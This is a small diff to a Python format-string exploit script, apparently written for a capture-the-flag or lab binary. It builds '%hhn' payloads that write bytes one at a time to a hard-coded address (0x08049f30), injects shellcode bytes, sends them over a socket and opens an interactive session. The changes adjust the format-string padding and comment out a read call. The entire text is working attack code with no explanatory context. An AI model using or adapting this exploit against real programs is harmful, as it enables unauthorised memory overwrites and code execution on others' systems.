@@ -28,7 +28,7 @@ def interact(s):
     t.interact()
 
 def writeByte(s, addr, val, idx):
-    format = "%%%05dc%%%d$hhn" % (val, idx + 4)
+    format = "%%%dc%%%d$hhn" % (val, idx + 4)
     format += "A"*(16 - len(format))
     sys.stdout.write(format)
     s.send(format)
@@ -77,7 +77,7 @@ for b in sc:
 exit = 0x08049f30
 for i in range(4):
     writeByte(s, exit + i, (argv>> (8 * i)) & 0xff, buf_start)
-    readLine(s)
+#readLine(s)
 
 s.send('quit\n')
 
